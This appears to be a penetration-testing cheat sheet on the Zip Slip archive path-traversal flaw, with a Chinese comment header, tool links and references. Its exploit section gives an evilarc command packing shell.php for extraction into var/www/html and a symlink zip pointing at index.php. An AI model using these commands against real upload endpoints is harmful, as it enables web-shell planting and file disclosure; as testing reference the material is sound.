<!--
 * [业务问题]: Zip Slip 是一种在解压文档时发生的目录遍历漏洞。攻击者构造包含目录遍历路径（如 ../../shell.php）的特制压缩包，当应用解压时，恶意文件会被写入到预期目录之外（如 Web 根目录），导致远程代码执行。
 * [实现逻辑]: 本文档介绍了 Zip Slip 的检测方法（上传 ZIP 功能）、基本利用方法（使用 evilarc 生成恶意压缩包、创建符号链接），并提供了相关工具链接。
 -->

# Zip Slip (压缩包目录遍历攻击)

> 该漏洞是通过使用包含目录遍历文件名（例如 ../../shell.php）的特制存档来利用的。Zip Slip 漏洞可以影响许多存档格式，包括 tar、jar、war、cpio、apk、rar 和 7z。攻击者随后可以覆盖可执行文件，并远程调用它们或等待系统或用户调用它们，从而在受害者的机器上实现远程命令执行。

## 概要 (Summary)

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Detection](#detection)
    * [Basic Exploit](#basic-exploit)
* [Additional Notes](#additional-notes)

## Tools

* [ptoomey3/evilarc](https://github.com/ptoomey3/evilarc) - Create tar/zip archives that can exploit directory traversal vulnerabilities
* [usdAG/slipit](https://github.com/usdAG/slipit) - Utility for creating ZipSlip archives

## Methodology

### Detection

Any ZIP upload page on the application.

### Basic Exploit

Using [ptoomey3/evilarc](https://github.com/ptoomey3/evilarc):

```python
python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
```

Creating a ZIP archive containing a symbolic link:

```ps1
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
```

### Additional Notes

For affected libraries and projects, visit [snyk/zip-slip-vulnerability](https://github.com/snyk/zip-slip-vulnerability)

## References

* [Zip Slip - Snyk - June 5, 2018](https://github.com/snyk/zip-slip-vulnerability)
* [Zip Slip Vulnerability - Snyk - April 15, 2018](https://snyk.io/research/zip-slip-vulnerability)
